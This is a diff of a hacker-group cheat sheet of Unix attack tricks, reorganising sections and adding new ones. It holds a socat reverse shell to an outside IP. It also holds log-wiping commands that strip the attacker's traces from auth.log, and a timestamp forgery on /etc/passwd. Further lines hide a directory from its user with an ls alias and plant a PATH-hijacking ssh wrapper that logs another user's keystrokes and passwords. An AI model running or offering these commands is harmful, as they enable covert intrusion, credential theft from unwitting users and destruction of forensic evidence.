@@ -1,4 +1,4 @@
-# THC's favourite Tips & Tricks & Hacks (Cheat Sheet)
+# THC's favourite Tips, Tricks & Hacks (Cheat Sheet)
 
 A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.
 
@@ -30,10 +30,23 @@ Got tricks? Send them to root@thc.org or submit a pull request.
       1. [without Bash](#rswob-anchor)
       1. [with Python](#rswpy-anchor)
       1. [with Perl](#rswpl-anchor)
-   1. [Upgrading to PTY](#rsu-anchor)
+   1. [Upgrading the dumb shell](#rsu-anchor)
       1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
       1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
       1. [Reverse shell with socat (fully interactive)](#rssc-anchor)
+ 6. [Shell Hacks](#sh-anchor)
+    1. [Shred files (secure delete)](#shsf-anchor)
+    1. [Shred files without *shred*](#shsfwo-anchor)
+    1. [Restore the date of a file](#shrdf-anchor)
+    1. [Clean logfile](#shcl-anchor)
+    1. [Hide files from a User without root priviledges](#shhu-anchor)
+ 7. [Crypto](#cr-anchor)
+    1. [Generate quick random Password](#crgrp-anchor)
+    1. [Linux transportable encrypted filesystems](#crltefs-anchor)
+ 8. [Miscellaneous](#misc-anchor)
+    1. [Sniff a user's SSH session](#sss-anchor)
+    1. [Sniff a user's SSH session without root priviledges](#ssswor-anchor)
+    
    
 
 ---
@@ -122,48 +135,6 @@ Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from our system (cou
 ```
 # tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
 ```
-
-**8. Sniff a SSH session**
-```
-$ strace -p <PID of ssh> -e trace=read -o ~/.ssh/ssh_log.txt
-$ grep 'read(4' ~/.ssh/ssh_log.txt | cut -f1 -d\"
-```
-Dirty way to monitor a user who is using ssh to connect to another host from a computer that you control.
-
-**9. Sniff a SSH session without root priviledges**
-
-Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)
-
-Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
-```
-# Add ~/.ssh to the execution PATH variable so our 'ssh' is executed instead of the real ssh:
-$ echo '$PATH=~/.local/bin:$PATH' >>~/.profile
-
-# Create our log directory and our own ssh binary
-$ mkdir ~/.ssh/.logs
-$ mkdir -p ~/.local/bin ~/.ssh/logs
-
-$ cat >~/.local/bin/ssh
-#! /bin/bash
-strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
-# now press CTRL-d to close the file.
-
-$ cat ~/.local/bin/ssh-log
-#! /bin/bash
-grep 'read(4' | cut -f2 -d\" | while read -r x; do
-        if [ ${#x} -ne 2 ] && [ ${#x} -ne 1 ]; then continue; fi
-        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then
-                echo ""
-        else
-                echo -n "${x}"
-        fi
-done >~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt
-# now press CTRL-d to close the file
-
-$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
-```
-
-The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
 ---
 <a id="fe-anchor"></a>
@@ -274,87 +245,6 @@ Get *screen* to slurp the base64 encoded data into screen's clipboard and paste 
 
 Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
-**14. Shred & Erase a file**
-
-```
-$ shred -z foobar.txt
-```
-
-**15. Shred & Erase without *shred***
-```
-$ FN=foobar.txt; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
-```
-Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.
-
-Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
-
-**16. Hide files as User from that User**
-
-```
-alias ls='ls -I SecretDirectory'
-```
-
-This will hide the directory *SecretDirectory* from the *ls* command. Place in user's *~/.profile*.
-
-**17. Restore the date of a file**
-
-Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
-
-```
-$ touch -r /etc/shadow /etc/passwd
-```
-
-
-**20. Generate quick random Password**
-
-Good for quick passwords without human element.
-
-```
-$ openssl rand -base64 24
-```
-
-**21. Get a root shell in Docker container.**
-
-If the container is already running:
-
-```
-$ docker exec -it --user root <container-name> /bin/bash
-```
-
-If the container is not running:
-
-```
-$ docker run -it --user root --entrypoint /bin/bash <container>
-```
-
-**22. Linux transportable encrypted filesystems.**
-
-Like truecrypt but better.  You may need to `losetup -f` to get a loop device.
-
-Make a junk file, here 256MB is used, encrypt, and partition. You will be prompted for a password.
-
-```
-$ dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
-$ cryptsetup luksFormat /tmp/crypted
-$ mkfs.ext3 /tmp/crypted
-```
-
-Mount:
-
-```
-# losetup /dev/loop0 /tmp/crypted
-# cryptsetup open /dev/loop0 crypted
-# mount -t ext3 /dev/mapper/crypted /mnt/crypted
-```
-
-Store data in `/mnt/crypted`, then unmount:
-
-```
-# umount /mnt/crypted
-# cryptsetup close crypted
-# losetup -d /dev/loop0
-```
-
 ---
 <a id="rs-anchor"></a>
 <a id="rswb-anchor"></a>
@@ -454,6 +344,141 @@ socat file:`tty`,raw,echo=0 tcp-listen:1524
 # on target host (reverse shell)
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 ```
+
+---
+<a id="sh-anchor"></a>
+<a id="shsf-anchor"></a>
+**6.i. Shred & Erase a file**
+
+```
+$ shred -z foobar.txt
+```
+
+<a id="shsfwo-anchor"></a>
+**6.ii. Shred & Erase without *shred***
+```
+$ FN=foobar.txt; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
+```
+Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.
+
+Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
+
+<a id="shrdf-anchor"></a>
+**6.iii. Restore the date of a file**
+
+Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
+
+```
+$ touch -r /etc/shadow /etc/passwd
+```
+
+<a id="shcl-anchor"></a>
+**6.iv. Clear logfile**
+
+This will reset the logfile to 0 without having to restart syslogd etc:
+```
+# cat /dev/null >/var/log/auth.log
+```
+
+This will remove any sign of us from the log file:
+```
+# grep -v 'thc\.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
+```
+
+<a id="shhu-anchor"></a>
+**6.v. Hide files from that User withour root priviledges**
+
+```
+alias ls='ls -I SecretDirectory'
+```
+
+This will hide the directory *SecretDirectory* from the *ls* command. Place in user's *~/.profile*.
+
+<a id="cr-anchor"></a>
+<a id="crgrp-anchor"></a>
+**7.i. Generate quick random Password**
+
+Good for quick passwords without human element.
+
+```
+$ openssl rand -base64 24
+```
+
+<a id="crltefs-anchor"></a>
+**7.ii. Linux transportable encrypted filesystems**
+
+Create a 256MB large encrypted file system. You will be prompted for a password.
+
+```
+$ dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
+$ cryptsetup luksFormat /tmp/crypted
+$ mkfs.ext3 /tmp/crypted
+```
+
+Mount:
+
+```
+# losetup -f
+# losetup /dev/loop0 /tmp/crypted
+# cryptsetup open /dev/loop0 crypted
+# mount -t ext3 /dev/mapper/crypted /mnt/crypted
+```
+
+Store data in `/mnt/crypted`, then unmount:
+
+```
+# umount /mnt/crypted
+# cryptsetup close crypted
+# losetup -d /dev/loop0
+```
+
+---
+<a id="misc-anchor"></a>
+<a id="sss-anchor"></a>
+**8.i. Sniff a user's SSH session**
+```
+$ strace -p <PID of ssh> -e trace=read -o ~/.ssh/ssh_log.txt
+$ grep 'read(4' ~/.ssh/ssh_log.txt | cut -f1 -d\"
+```
+Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
+
+<a id="ssswor-anchor"></a>
+**8.ii. Sniff a user's SSH session without root priviledges**
+
+Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)
+
+Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
+```
+# Add ~/.ssh to the execution PATH variable so our 'ssh' is executed instead of the real ssh:
+$ echo '$PATH=~/.local/bin:$PATH' >>~/.profile
+
+# Create our log directory and our own ssh binary
+$ mkdir ~/.ssh/.logs
+$ mkdir -p ~/.local/bin ~/.ssh/logs
+
+$ cat >~/.local/bin/ssh
+#! /bin/bash
+strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
+# now press CTRL-d to close the file.
+
+$ cat ~/.local/bin/ssh-log
+#! /bin/bash
+grep 'read(4' | cut -f2 -d\" | while read -r x; do
+        if [ ${#x} -ne 2 ] && [ ${#x} -ne 1 ]; then continue; fi
+        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then
+                echo ""
+        else
+                echo -n "${x}"
+        fi
+done >~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt
+# now press CTRL-d to close the file
+
+$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
+```
+
+The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
+
+
 
 ---
 Shoutz: ADM
